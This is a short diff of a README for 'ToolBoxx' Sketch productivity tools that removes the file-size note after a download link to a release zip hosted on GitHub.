@@ -4,7 +4,7 @@ Sketch productivity tools — public release.
 
 ## Download
 
-[ToolBoxx-1.1.2-20260714.zip](https://github.com/N0TB0T/toolboxx26/raw/main/ToolBoxx-1.1.2-20260714.zip) (106 KB)
+[ToolBoxx-1.1.2-20260714.zip](https://github.com/N0TB0T/toolboxx26/raw/main/ToolBoxx-1.1.2-20260714.zip)
 
 ## Installation
 
